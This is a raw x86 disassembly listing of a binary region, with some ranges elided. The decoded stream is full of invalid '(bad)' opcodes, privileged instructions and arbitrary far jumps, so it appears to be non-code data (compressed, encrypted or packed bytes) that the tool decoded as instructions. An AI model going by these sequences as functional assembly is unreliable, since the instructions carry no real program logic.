  4162c1:	ja     0x4162c7
  4162c3:	daa    
  4162c4:	sub    edx,DWORD PTR [esi+0x28b452fa]
  4162ca:	test   DWORD PTR [edi-0xc3920d9],0x304e884e
  4162d4:	adc    DWORD PTR [ebp+0x5b],esp
  4162d7:	mov    dh,0x2a
  4162d9:	xchg   edi,eax
  4162da:	and    DWORD PTR [edi],0xa0294fc3
  4162e0:	pop    ds
  4162e1:	fadd   QWORD PTR [esi+0x42a3c6d3]
  4162e7:	test   al,0xc
  4162e9:	add    BYTE PTR [ebx-0x75],0x43
  4162ed:	and    eax,DWORD PTR [edx+0x4d]
  4162f0:	js     0x416344
  4162f2:	cdq    
  4162f3:	jg     0x4162e3
  4162f5:	(bad)  
  4162f6:	(bad)  
  4162f7:	fldlg2 
  4162f9:	emms   
  4162fb:	xor    al,0xeb
  4162fd:	add    al,0x1e
  4162ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416300:	inc    ebx
  416301:	dec    esp
  416302:	jmp    0x6a6705c9
  416307:	jl     0x4162d6
  416309:	out    0x31,al
  41630b:	sbb    eax,0x1f20c0b3
  416310:	aas    
  416311:	(bad)  
  416312:	test   al,0x43
  416314:	scas   al,BYTE PTR es:[edi]
  416315:	out    0xd8,eax
  416317:	les    esp,FWORD PTR [ebp+0x273b3b9f]
  41631d:	xchg   ebx,eax
  41631e:	test   BYTE PTR [eax],dh
  416320:	ds push ebp
  416322:	adc    eax,0x8f29bcbd
  416327:	rep lods eax,DWORD PTR ds:[esi]
  416329:	push   edi
  41632a:	out    dx,eax
  41632b:	push   es
  41632c:	rcl    ebp,1
  41632e:	sbb    esi,esp
  416330:	lds    ebx,FWORD PTR [esi]
  416332:	call   esi
  416334:	popa   
  416335:	lock lock inc ecx
  416338:	shl    BYTE PTR [eax+ebp*2],0x4b
  41633c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41633d:	jg     0x416319
  41633f:	enter  0x5fef,0x2c
  416343:	sub    BYTE PTR [esi-0xb901919],ah
  416349:	or     DWORD PTR [eax-0x40],0xffffffeb
  41634d:	aaa    
  41634e:	and    BYTE PTR [edx+esi*8],ch
  416351:	sar    BYTE PTR [esi-0x4f2057e6],0xe9
  416358:	repnz call FWORD PTR [ebp+0x25d0d5d0]
  41635f:	into   
  416360:	fistp  WORD PTR [edx-0x57]
  416363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416364:	sbb    al,0x1f
  416366:	lods   eax,DWORD PTR ds:[esi]
  416367:	ret    
  416368:	mov    edx,edx
  41636a:	inc    ebx
  41636b:	sub    al,0x3d
  41636d:	mov    cl,0x6e
  41636f:	add    eax,0x3b83d71
  416374:	pop    esp
  416375:	rol    dl,1
  416377:	cmp    ch,BYTE PTR [ebp-0x7032f468]
  41637d:	jne    0x4163ae
  41637f:	ret    
  416380:	aas    
  416381:	fiadd  WORD PTR [edi+0x3f]
  416384:	mov    esi,0xe360870d
  416389:	push   eax
  41638a:	jo     0x4163c0
  41638c:	and    BYTE PTR [ecx-0x26],al
  41638f:	pop    ds
  416390:	aad    0x45
  416392:	mov    dl,0x13
  416394:	cs inc ecx
  416396:	lea    ebx,[ecx-0x45]
  416399:	cli    
  41639a:	mov    ebx,0x45a2d07b
  41639f:	int3   
  4163a0:	bound  eax,QWORD PTR [edx+eiz*8]
  4163a3:	aas    
  4163a4:	mov    cl,0xf5
  4163a6:	jnp    0x416335
  4163a8:	loopne 0x4163db
  4163aa:	inc    edx
  4163ab:	jg     0x416359
  4163ad:	test   esp,edi
  4163af:	fstp   TBYTE PTR [ecx-0x29]
  4163b2:	stc    
  4163b3:	adc    DWORD PTR [eax+0x0],esi
	...
  416416:	repz inc ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp-0x3e23d10f],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	xrelease mov DWORD PTR [edx],ebx
  416431:	sub    eax,0x7af94ebb
  416436:	pop    ss
  416437:	add    eax,0x914b00e0
  41643c:	xchg   esp,eax
  41643d:	scas   eax,DWORD PTR es:[edi]
  41643e:	pop    ebp
  41643f:	jmp    0x4b647670
  416444:	mov    al,0x6f
  416446:	mov    edi,0xea5c6cef
  41644b:	cs mov ch,0x15
  41644e:	push   0xad571693
  416453:	mov    edi,0x992691da
  416458:	in     al,dx
  416459:	jmp    0x4d71:0xc436d15c
  416460:	adc    BYTE PTR [esp+ebx*8],cl
  416463:	pop    ecx
  416464:	stos   DWORD PTR es:[edi],eax
  416465:	repz adc al,0x7a
  416468:	popf   
  416469:	int3   
  41646a:	mov    ch,0x0
  41646c:	in     al,dx
  41646d:	stos   DWORD PTR es:[edi],eax
  41646e:	mov    ebx,0x2d10f017
  416473:	ficom  WORD PTR [esi-0x64]
  416476:	rcr    ch,1
  416478:	sub    al,0x3e
  41647a:	nop
  41647b:	jmp    0xff48:0x92ace07f
  416482:	popf   
  416483:	mov    eax,0x6808e425
  416488:	add    BYTE PTR [ebp+0xf6da067],bl
  41648e:	arpl   bp,si
  416490:	int    0x1e
  416492:	mov    dh,0xc4
  416494:	cmp    DWORD PTR [ebx+0x70],esp
  416497:	sbb    DWORD PTR [edi+ebp*4+0x12148526],esi
  41649e:	fisubr WORD PTR ss:[ebx]
  4164a1:	popf   
  4164a2:	xor    eax,0x29b7b0c6
  4164a7:	test   BYTE PTR [edx+ecx*8-0x42],bh
  4164ab:	adc    al,0x8f
  4164ad:	mov    ds:0x3d143a2f,eax
  4164b2:	adc    DWORD PTR [edi+0x55],esi
  4164b5:	sbb    BYTE PTR [edx+0x63],0x7b
  4164b9:	mov    edx,0x5d82b36e
  4164be:	xchg   edi,eax
  4164bf:	mov    ebx,DWORD PTR [edi]
  4164c1:	int    0xa5
  4164c3:	and    eax,0x22d25c18
  4164c8:	mov    al,ds:0xc54f3d18
  4164cd:	(bad)  
  4164ce:	mov    ah,0xce
  4164d0:	js     0x416505
  4164d2:	lea    edx,[esi-0x2239d7f3]
  4164d8:	mov    ebp,0xa645cc18
  4164dd:	mov    ds:0x407b3d57,eax
  4164e2:	ret    
  4164e3:	jge    0x41648b
  4164e5:	sub    DWORD PTR [eax],0x6c
  4164e8:	sub    dl,BYTE PTR [esi]
  4164ea:	push   cs
  4164eb:	pop    es
  4164ec:	in     al,0xa6
  4164ee:	pop    ebp
  4164ef:	pop    es
  4164f0:	icebp  
  4164f1:	xchg   edi,eax
  4164f2:	ds sbb eax,0xa9d45b76
  4164f8:	hlt    
  4164f9:	ja     0x41651c
  4164fb:	(bad)  
  4164fc:	lea    edi,[eax+0x24]
  4164ff:	daa    
  416500:	sbb    esi,edi
  416502:	mov    WORD PTR [eax+ebp*8-0x7276a9af],gs
  416509:	wbinvd 
  41650b:	std    
  41650c:	pop    es
  41650d:	pushf  
  41650e:	aam    0x50
  416510:	xor    al,0x19
  416512:	xchg   ebx,eax
  416513:	push   esp
  416514:	lea    edx,[esi-0x2d]
  416517:	and    bh,BYTE PTR [esi-0x29]
  41651a:	mov    eax,0x3f84e63e
  41651f:	sbb    eax,0xf152a95e
  416524:	in     eax,0x69
  416526:	and    ecx,edx
  416528:	loope  0x416593
  41652a:	add    al,0xcc
  41652c:	jle    0x4165a7
  41652e:	or     BYTE PTR [ecx-0x19],cl
  416531:	sub    cl,al
  416533:	xchg   edx,eax
  416534:	xor    eax,DWORD PTR [eax]
	...
  416596:	and    eax,0xfff32bd8
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x4165bf
  4165a3:	in     al,0xb4
  4165a5:	mov    al,ds:0xe9a3
  4165aa:	pop    es
  4165ab:	add    DWORD PTR [eax],eax
  4165ad:	add    bl,bh
  4165af:	iret   
  4165b0:	pop    edi
  4165b1:	sub    DWORD PTR [ebx],edi
  4165b3:	mov    al,0x1
  4165b5:	push   es
  4165b6:	jg     0x4165a6
  4165b8:	ss fild WORD PTR ss:[esi]
  4165bc:	cmp    ebp,DWORD PTR [ecx]
  4165be:	dec    esi
  4165bf:	fisubr DWORD PTR [ebx-0x53]
  4165c2:	imul   ecx,eax,0xfffffffd
  4165c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165c6:	and    eax,0xdd4f8b41
  4165cb:	mov    bl,ah
  4165cd:	mov    DWORD PTR [esi+0x36],edx
  4165d0:	pop    ebx
  4165d1:	inc    ebx
  4165d2:	mov    eax,0xd6f06f3d
  4165d7:	cmp    ch,ch
  4165d9:	push   eax
  4165da:	push   0x2cd1796
  4165df:	adc    al,0xb8
  4165e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165e2:	sti    
  4165e3:	aad    0x35
  4165e5:	cmp    BYTE PTR [edi+0x451d026c],ch
  4165eb:	call   0xfcd0:0xaf7cb228
  4165f2:	and    BYTE PTR [esi-0x49],ch
  4165f5:	sti    
  4165f6:	jns    0x41664e
  4165f8:	mov    ds:0x550e3f14,eax
  4165fd:	jge    0x416624
  4165ff:	iret   
  416600:	dec    esi
  416601:	icebp  
  416602:	test   eax,0x2ce03c02
  416607:	out    dx,eax
  416608:	mov    esp,0xe976da14
  41660d:	mov    cl,0xec
  41660f:	(bad)  
  416610:	adc    eax,0x88bcd1d8
  416615:	inc    eax
  416616:	stc    
  416617:	sbb    eax,0xa081a93f
  41661c:	jae    0x4165f3
  41661e:	repnz fdivp st(2),st
  416621:	dec    esp
  416622:	mov    ebp,0x7f0f974e
  416627:	jge    0x416648
  416629:	push   ebp
  41662a:	add    WORD PTR [edi+0xd],ax
  41662e:	aaa    
  41662f:	inc    edx
  416630:	jno    0x416690
  416632:	cmp    dh,al
  416634:	xchg   ebp,eax
  416635:	maxps  xmm6,XMMWORD PTR [edi-0x13]
  416639:	adc    esp,DWORD PTR es:[ebp+0x59]
  41663d:	jo     0x416668
  41663f:	sbb    DWORD PTR [edi+0x5be5f9f9],edx
  416645:	and    ah,bh
  416647:	pop    esi
  416648:	addr16 push ss
  41664a:	xor    bh,cl
  41664c:	imul   DWORD PTR [esi]
  41664e:	push   es
  41664f:	mov    esp,0x8b90035f
  416654:	push   0xffffff81
  416656:	jle    0x416603
  416658:	aaa    
  416659:	lds    eax,FWORD PTR [eax+ecx*4+0x3d]
  41665d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41665e:	std    
  41665f:	outs   dx,DWORD PTR ds:[esi]
  416660:	loope  0x416676
  416662:	pop    esi
  416663:	popf   
  416664:	clc    
  416665:	sbb    eax,0xaf00a6f8
  41666a:	jnp    0x4166b8
  41666c:	lods   eax,DWORD PTR ds:[esi]
  41666d:	repnz mov eax,ds:0x43e60a90
  416673:	imul   ecx,DWORD PTR [edx-0x286affdd],0x20
  41667a:	loop   0x4166a1
  41667c:	mov    bh,0xc
  41667e:	sti    
  41667f:	jp     0x4166de
  416681:	cmc    
  416682:	add    DWORD PTR [ebp-0x14],edi
  416685:	sub    BYTE PTR [ebp-0x3a3b5a63],cl
  41668b:	pushf  
  41668c:	mov    ecx,DWORD PTR ds:0xb25bed89
  416692:	cmp    esp,DWORD PTR ds:0x721803af
  416698:	or     eax,0xd1ff8d13
  41669d:	add    ch,BYTE PTR [ebp-0x12]
  4166a0:	add    esi,DWORD PTR [ecx-0x6b]
  4166a3:	daa    
  4166a4:	ins    BYTE PTR es:[edi],dx
  4166a5:	jb     0x4166b6
  4166a7:	(bad)  
  4166a8:	outs   dx,DWORD PTR ds:[esi]
  4166a9:	xchg   ecx,eax
  4166aa:	cmp    al,0x5c
  4166ac:	mov    cl,BYTE PTR [eax]
  4166ae:	mov    al,ds:0x55ffa0ad
  4166b3:	cld    
  4166b4:	fadd   DWORD PTR [eax]
	...
  416716:	(bad)  
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	fisubr DWORD PTR [ebp-0x67]
  416725:	pop    esp
  416726:	stos   BYTE PTR es:[edi],al
  416727:	jmp    0x0:0x1070000
  41672e:	dec    esi
  41672f:	cwde   
  416730:	ins    DWORD PTR es:[edi],dx
  416731:	and    ebx,DWORD PTR [esi+0x39]
  416734:	mov    ch,0x4a
  416736:	mov    WORD PTR [esi-0xd],gs
  416739:	xchg   esi,esp
  41673b:	adc    dh,BYTE PTR [ecx+0x27]
  41673e:	int3   
  41673f:	lds    edx,FWORD PTR [edx]
  416741:	sbb    dh,ah
  416743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416744:	scas   al,BYTE PTR es:[edi]
  416745:	jl     0x4167a5
  416747:	(bad)  
  416748:	push   0x33f7e505
  41674d:	fwait
  41674e:	adc    esi,ebp
  416750:	(bad)
  416754:	mov    dh,BYTE PTR [ebx]
  416756:	(bad)  
  416757:	xchg   edi,eax
  416758:	loope  0x416721
  41675a:	int3   
  41675b:	pop    esi
  41675c:	add    eax,0xe875e58c
  416761:	xchg   edi,eax
  416762:	call   0x4dc6e3e1
  416767:	add    BYTE PTR [edx-0xbf7bc65],bl
  41676d:	jmp    0xc903e023
  416772:	or     DWORD PTR [ebx+0x53a45b2e],0x7
  416779:	jl     0x4167aa
  41677b:	lahf   
  41677c:	and    eax,0xd52e89f0
  416781:	mov    dl,0xe8
  416783:	xchg   ebp,eax
  416784:	inc    ebp
  416785:	data16 sti 
  416787:	(bad)  
  416788:	shr    BYTE PTR [ecx-0x2004266f],1
  41678e:	cwde   
  41678f:	xchg   ecx,eax
  416790:	adc    edi,DWORD PTR [edx]
  416792:	cdq    
  416793:	or     BYTE PTR [edi],bh
  416795:	aaa    
  416796:	adc    BYTE PTR [ecx],al
  416798:	daa    
  416799:	xor    al,0xc2
  41679b:	das    
  41679c:	add    BYTE PTR [edx-0x13676728],dh
  4167a2:	rol    bh,1
  4167a4:	scas   eax,DWORD PTR es:[edi]
  4167a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167a6:	pop    ds
  4167a7:	dec    edx
  4167a8:	scas   al,BYTE PTR es:[edi]
  4167a9:	push   edi
  4167aa:	push   ecx
  4167ab:	or     edi,DWORD PTR [ebx-0x49236a7b]
  4167b1:	or     esi,DWORD PTR [ecx+0x79695af1]
  4167b7:	aam    0xa1
  4167b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167bb:	sbb    ah,bl
  4167bd:	in     eax,0xc4
  4167bf:	push   esi
  4167c0:	leave  
  4167c1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167c3:	add    al,0xc2
  4167c5:	adc    ecx,esi
  4167c7:	jmp    0x2aefbbe1
  4167cc:	in     al,0x79
  4167ce:	and    eax,0x9c84a060
  4167d3:	cld    
  4167d4:	pop    edx
  4167d5:	popa   
  4167d6:	retf   
  4167d7:	pushf  
  4167d8:	pop    edi
  4167d9:	sub    esp,DWORD PTR [ebp-0x4c]
  4167dc:	mov    cl,0x25
  4167de:	xchg   esp,eax
  4167df:	in     al,0x1b
  4167e1:	pushf  
  4167e2:	adc    eax,0x2d534eff
  4167e7:	mov    edi,0x64f8a7fc
  4167ec:	aad    0xd7
  4167ee:	mov    BYTE PTR [esi-0x56d2a5fa],dl
  4167f4:	mov    ds:0x9ca5b612,al
  4167f9:	and    eax,0x368b83e2
  4167fe:	aaa    
  4167ff:	test   DWORD PTR [esi+0x10],ebp
  416802:	aam    0x37
  416804:	cdq    
  416805:	mov    cl,0x5a
  416807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416808:	popa   
  416809:	jmp    0xc6b1:0x5c41b048
  416810:	sbb    BYTE PTR [ebx+0x35],bl
  416813:	out    dx,al
  416814:	mov    bh,0x4f
  416816:	jg     0x41683c
  416818:	ins    DWORD PTR es:[edi],dx
  416819:	inc    eax
  41681a:	addr16 pop eax
  41681c:	lods   eax,DWORD PTR ds:[esi]
  41681d:	cmp    dl,BYTE PTR [esp+ebp*8+0x2643898]
  416824:	out    0x8a,al
  416826:	and    ebx,ebx
  416828:	outs   dx,DWORD PTR ds:[esi]
  416829:	or     al,0xe0
  41682b:	leave  
  41682c:	arpl   cx,bp
  41682e:	push   ebp
  41682f:	push   ss
  416830:	outs   dx,DWORD PTR ds:[esi]
  416831:	iret   
  416832:	adc    DWORD PTR [esi+0x3c],0x0
	...
  416895:	add    cl,dl
  416897:	scas   eax,DWORD PTR es:[edi]
  416898:	push   es
  416899:	repz jle 0x416897
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	bnd call 0xb1b62476
  4168a7:	jmp    0x4168a9
  4168a9:	add    BYTE PTR [edi],al
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    BYTE PTR [edx+0x7e],bl
  4168b0:	fcmovnbe st,st(7)
  4168b2:	add    DWORD PTR [ecx-0xd35f487],eax
  4168b8:	mov    ?,WORD PTR [edi]
  4168ba:	xor    ecx,ebp
  4168bc:	loop   0x416852
  4168be:	call   0xac3ab121
  4168c3:	sub    eax,0xcd6506ac
  4168c8:	or     eax,0xbcceccec
  4168cd:	dec    ebp
  4168ce:	xchg   edi,eax
  4168cf:	jb     0x41693b
  4168d1:	ret    
  4168d2:	ret    
  4168d3:	pop    ds
  4168d4:	in     al,dx
  4168d5:	pop    ss
  4168d6:	jb     0x4168d2
  4168d8:	aad    0xae
  4168da:	push   es
  4168db:	mov    ch,0xd3
  4168dd:	xchg   ebp,eax
  4168de:	sub    DWORD PTR [eax+0x69afe951],esp
  4168e4:	mov    bl,BYTE PTR [eax+0x2a2fb519]
  4168ea:	loopne 0x416968
  4168ec:	push   edx
  4168ed:	cmp    ebx,DWORD PTR [ebp-0x43]
  4168f0:	sbb    BYTE PTR [edi-0x718b62cc],dh
  4168f6:	clc    
  4168f7:	sbb    esp,DWORD PTR fs:[ebp-0x2dc6a664]
  4168fe:	jae    0x41696d
  416900:	pop    eax
  416901:	sbb    al,BYTE PTR [esi-0x72]
  416904:	push   edx
  416905:	dec    ebp
  416906:	ins    DWORD PTR es:[edi],dx
  416907:	xor    al,0x1c
  416909:	sub    cl,BYTE PTR [ecx+ebx*2]
  41690c:	xchg   DWORD PTR [ebx],esi
  41690e:	push   esi
  41690f:	test   al,0xb2
  416911:	push   esi
  416912:	xchg   ebx,eax
  416913:	pop    ds
  416914:	xlat   BYTE PTR ds:[ebx]
  416915:	jp     0x4168b7
  416917:	in     eax,dx
  416918:	inc    eax
  416919:	xchg   ebp,eax
  41691a:	sub    al,0x55
  41691d:	retf   0xe70c
  416920:	mov    edx,0x14d68525
  416925:	call   0x8e86:0x82a6eac
  41692c:	dec    edi
  41692d:	push   ecx
  41692e:	xor    cl,BYTE PTR [ebx+ebx*4]
  416931:	and    eax,DWORD PTR [ebp+0x4ffdf75c]
  416937:	adc    al,0x44
  416939:	xchg   ebx,eax
  41693a:	adc    ch,BYTE PTR [ebx+eax*1-0x1d0ff158]
  416941:	pop    es
  416942:	mov    eax,0xfa4b02ed
  416947:	mov    ds:0x842318a4,eax
  41694c:	adc    dl,al
  41694e:	or     bh,BYTE PTR [ebx]
  416950:	mov    sp,0x731e
  416954:	mov    al,ds:0xdb33ddf9
  416959:	mov    al,ds:0x670f7bc8
  41695e:	jge    0x4168f6
  416960:	add    al,0xb3
  416962:	loop   0x41697e
  416964:	cmc    
  416965:	in     al,dx
  416966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416967:	push   esi
  416968:	adc    bl,BYTE PTR [eax+0x405dc073]
  41696e:	in     eax,dx
  41696f:	pop    edx
  416970:	cdq    
  416971:	repnz xor DWORD PTR [edx+0x4],ebx
  416975:	and    bh,bh
  416977:	loop   0x4169bc
  416979:	or     bl,BYTE PTR [edi+0x7f]
  41697c:	pop    ebp
  41697d:	push   ds
  41697e:	clc    
  41697f:	sub    ah,bh
  416981:	ins    BYTE PTR es:[edi],dx
  416982:	loope  0x41690c
  416984:	(bad)  
  416985:	push   ebx
  416986:	(bad)  
  416987:	ret    0x12b4
  41698a:	inc    ecx
  41698b:	xchg   ebx,eax
  41698c:	mov    bl,0xfb
  41698e:	jl     0x4169f6
  416990:	pop    ds
  416991:	shr    DWORD PTR [edi],1
  416993:	stos   BYTE PTR es:[edi],al
  416994:	adc    BYTE PTR [edi+0x3a979f74],0xe3
  41699b:	or     eax,0xae8f8b9d
  4169a0:	daa    
  4169a1:	inc    ebp
  4169a2:	jp     0x416a06
  4169a4:	xlat   BYTE PTR ds:[ebx]
  4169a5:	cmp    bh,BYTE PTR [eax-0x7]
  4169a8:	jbe    0x4169d4
  4169aa:	pop    ebx
  4169ab:	(bad)
  4169ae:	mov    edi,0x13b622c8
  4169b3:	inc    eax
  4169b4:	jecxz  0x4169b6
	...
  416a16:	retf   
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	rsm    
  416a24:	adc    DWORD PTR [bx+si+0xec],edi
  416a29:	add    BYTE PTR [edi],al
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [ebx],bh
  416a2f:	(bad)  
  416a30:	shl    cl,1
  416a32:	and    DWORD PTR [ebp+0x4834410b],ebp
  416a38:	add    al,0x6
  416a3a:	and    eax,0x14fd89b1
  416a3f:	inc    ebx
  416a40:	dec    esi
  416a41:	test   DWORD PTR [edx-0x45],ebp
  416a44:	xor    DWORD PTR [esi+ebp*8-0x55c7b9fe],ebp
  416a4b:	mov    esp,0x96e10e2c
  416a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a52:	and    esp,ebx
  416a54:	jmp    0xc221ca7a
  416a59:	xlat   BYTE PTR ds:[ebx]
  416a5a:	adc    al,0x69
  416a5c:	test   al,0x22
  416a5e:	out    0x73,al
  416a60:	jmp    0x1d40:0x30c702b3
  416a67:	ja     0x416ac3
  416a69:	(bad)  
  416a6b:	push   ds
  416a6c:	mov    bl,0x6c
  416a6e:	inc    esp
  416a6f:	addr16 sti 
  416a71:	lea    esi,[eax-0x26701151]
  416a77:	mov    ds:0x9f988de4,eax
  416a7c:	rcr    esi,1
  416a7e:	pop    esi
  416a7f:	enter  0xbdfb,0x58
  416a83:	sbb    ebp,esp
  416a85:	jle    0x416b01
  416a87:	sub    eax,0xf0fe2ac4
  416a8c:	jle    0x416a2c
  416a8e:	xchg   esp,eax
  416a8f:	out    0x63,eax
  416a91:	in     eax,dx
  416a92:	mov    ds:0x22761b1a,eax
  416a97:	into   
  416a98:	or     cl,dh
  416a9a:	enter  0x3b12,0x71
  416a9e:	sub    al,0x84
  416aa0:	jmp    0x416b1e
  416aa2:	idiv   BYTE PTR [esi-0x23]
  416aa5:	mov    ebp,0x787b3628
  416aaa:	jmp    0x416a9c
  416aac:	inc    edi
  416aad:	dec    edx
  416aae:	sub    BYTE PTR [edi+0x3f0e1916],al
  416ab4:	mov    eax,ds:0xf90f4962
  416ab9:	les    edx,FWORD PTR [eax]
  416abb:	push   es
  416abc:	bound  esp,QWORD PTR [ebx+0x20]
  416abf:	popa   
  416ac0:	inc    esi
  416ac1:	and    BYTE PTR [edi],bl
  416ac3:	(bad)  
  416ac4:	out    dx,al
  416ac5:	add    eax,0xe2587b4a
  416aca:	dec    edx
  416acb:	xchg   edi,eax
  416acc:	and    BYTE PTR [ebx],dl
  416ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416acf:	std    
  416ad0:	cmp    eax,DWORD PTR [ebp+ebp*4-0x17]
  416ad4:	mov    WORD PTR [ebx+0x3f],es
  416ad7:	(bad)  
  416ad8:	mov    al,ds:0x653cedea
  416add:	imul   esi,DWORD PTR [esi],0x87d0c819
  416ae3:	xchg   ecx,eax
  416ae4:	push   cs
  416ae5:	and    bh,BYTE PTR [ebp*4-0x52b16557]
  416aec:	mov    esi,0x99a1e70
  416af1:	test   BYTE PTR [ebx-0x4a21b245],bh
  416af7:	cmp    dl,BYTE PTR [edx+0x31]
  416afa:	stc    
  416afb:	ins    BYTE PTR es:[edi],dx
  416afc:	jge    0x416ac3
  416afe:	mov    eax,ds:0x43b00c24
  416b03:	push   esi
  416b04:	add    al,0x8b
  416b06:	fmul   DWORD PTR [edx+ecx*1-0x76b31b09]
  416b0d:	cwde   
  416b0e:	lods   eax,DWORD PTR ds:[esi]
  416b0f:	cmp    ah,ah
  416b11:	les    esp,FWORD PTR [edi+0x3d]
  416b14:	popf   
  416b15:	les    ebx,FWORD PTR [edi+0xe8b1c19]
  416b1b:	enter  0x8087,0xbd
  416b1f:	xlat   BYTE PTR ds:[ebx]
  416b20:	fmul   DWORD PTR [edx+edx*4-0x43]
  416b24:	mov    dx,di
  416b27:	jne    0x416b1b
  416b29:	jb     0x416b11
  416b2b:	sti    
  416b2c:	loopne 0x416afe
  416b2e:	mov    eax,0x78ac1236
  416b33:	lds    edi,FWORD PTR [esi+0x0]
	...
  416b96:	jecxz  0x416bfd
  416b98:	push   cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0x2ba56b6b
  416ba3:	test   al,0xd5
  416ba5:	das    
  416ba6:	mov    edi,0x70000ed
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    dh,dl
  416baf:	ja     0x416ba7
  416bb1:	jmp    0x295a:0x4f004ee6
  416bb8:	dec    eax
  416bb9:	cmp    DWORD PTR [esi],0xd680684c
  416bbf:	mov    ds:0x2d21e9f5,eax
  416bc4:	dec    ebx
  416bc5:	pop    ebp
  416bc6:	adc    al,0x16
  416bc8:	mov    bh,0x8c
  416bca:	jo     0x416bf7
  416bcc:	dec    edi
  416bcd:	sbb    esp,DWORD PTR [edx-0x6f1d200d]
  416bd3:	dec    ebp
  416bd4:	inc    ebx
  416bd5:	shr    BYTE PTR [edi],cl
  416bd7:	mov    eax,0x8599db88
  416bdc:	cmp    DWORD PTR [eax],0xffffffd0
  416bdf:	jns    0x416b89
  416be1:	pop    ecx
  416be2:	pop    esp
  416be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416be4:	pop    edi
  416be5:	into   
  416be6:	(bad)  
  416be7:	sub    al,BYTE PTR [edx]
  416be9:	int    0xe1
  416beb:	jmp    0x890:0x3af8d79
  416bf2:	aaa    
  416bf3:	push   ss
  416bf4:	jecxz  0x416c4f
  416bf6:	not    DWORD PTR [eax-0x55]
  416bf9:	and    ebx,DWORD PTR [ecx-0x65f9b9c8]
  416bff:	div    DWORD PTR [eax+0x228991d5]
  416c05:	sub    eax,0x95741928
  416c0a:	test   BYTE PTR [esi+0x60a04ee5],ch
  416c10:	jmp    0x416beb
  416c12:	or     BYTE PTR [eax],dh
  416c14:	cwde   
  416c15:	fwait
  416c16:	push   ebx
  416c17:	inc    esi
  416c18:	jno    0x416bde
  416c1a:	mov    ecx,0x1af30ccf
  416c1f:	xchg   ecx,eax
  416c20:	sub    ch,BYTE PTR [esi+0x6]
  416c23:	mov    al,ds:0x672353b7
  416c28:	push   cs
  416c29:	mov    DWORD PTR [eax+0x7791f3a],edx
  416c2f:	mov    bh,0x65
  416c31:	xor    al,0x84
  416c33:	mov    ah,0x71
  416c35:	xchg   ebp,eax
  416c36:	ret    
  416c37:	sbb    edx,esi
  416c39:	mov    dl,0x57
  416c3b:	out    dx,eax
  416c3c:	pop    edx
  416c3d:	leave  
  416c3e:	jp     0x416c81
  416c40:	retf   0xf38c
  416c43:	rcl    bh,cl
  416c45:	shr    DWORD PTR [bx+di-0x5d],0xb2
  416c4a:	aas    
  416c4b:	imul   edx,DWORD PTR [ebx],0xffffffaa
  416c4e:	inc    edi
  416c4f:	pop    es
  416c50:	push   ebp
  416c51:	gs mov ss,esi
  416c54:	mov    ch,0x3
  416c56:	dec    eax
  416c57:	fxch   st(6)
  416c59:	popa   
  416c5a:	ds shl bl,1
  416c5d:	les    edi,FWORD PTR [ecx+0x28083073]
  416c63:	mov    edx,0xd968dfe2
  416c68:	into   
  416c69:	and    ecx,DWORD PTR [ebx-0x2a]
  416c6c:	ror    bh,1
  416c6e:	aam    0xf5
  416c70:	rcl    BYTE PTR [ebp-0x6fcf6dcb],0x36
  416c77:	sub    eax,0xa09ab63a
  416c7c:	loopne 0x416cf6
  416c7e:	ffreep st(3)
  416c80:	and    al,0x4e
  416c82:	lea    esi,[ebx-0x5bc9278d]
  416c88:	mov    WORD PTR [ebp+0x119fd535],?
  416c8e:	sahf   
  416c8f:	mov    ds:0x3e0a44cf,al
  416c94:	(bad)  
  416c95:	clc    
  416c96:	inc    eax
  416c97:	mov    eax,gs:0x9d735993
  416c9d:	and    DWORD PTR [eax],esp
  416c9f:	imul   edx,DWORD PTR [edx-0x4f6456de],0xffffff88
  416ca6:	js     0x416c3b
  416ca8:	jb     0x416c3a
  416caa:	mov    eax,ds:0x57bc4ed5
  416caf:	fst    QWORD PTR [ebx-0x10]
  416cb2:	arpl   cx,bp
  416cb4:	ins    BYTE PTR es:[edi],dx
	...
  416d15:	add    BYTE PTR [ecx],ah
  416d17:	xchg   ebx,eax
  416d18:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d1e:	or     DWORD PTR ds:0x8adf80c9,edi
  416d24:	sbb    BYTE PTR [ecx-0x3a],al
  416d27:	out    dx,al
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    BYTE PTR [esi+esi*8-0x7c],ah
  416d31:	sub    BYTE PTR [ebp+0x8],bl
